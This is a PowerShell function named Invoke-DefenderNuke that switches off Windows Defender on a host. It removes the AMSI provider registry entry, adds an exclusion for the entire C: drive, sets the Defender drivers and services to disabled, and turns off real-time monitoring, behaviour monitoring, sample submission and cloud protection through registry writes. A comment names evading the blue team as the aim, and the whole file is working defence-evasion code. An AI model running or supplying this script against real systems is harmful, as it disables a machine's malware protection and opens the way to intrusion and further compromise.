function Invoke-DefenderNuke {

    # Permanently remove AMSI
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

    # Exclude entire drive in case blue team resolves issues
    Add-MpPreference -ExclusionPath "C:\"

    # Stop core servcies
    # TODO: Break service permissions
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter" -Name "Start" -Value 4 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv" -Name "Start" -Value 4 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc" -Name "Start" -Value 4 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Force

    # Disable Core Defender Capability
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force 

    # Disable Real-Time Monitoring
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force

    # Disable Behavior Monitoring
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force

    # Disable Automatic Sample Submission
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Force

    # Disable Cloud Based Protection
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Force
    

    #Disable Core Defender Capability
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force

    # Disable Real-Time Monitoring
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force

    # Disable Behavior Monitoring
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force
    
    # Disable Automatic Sample Submission
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Force

    # Disable Cloud Based Protection
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Force
}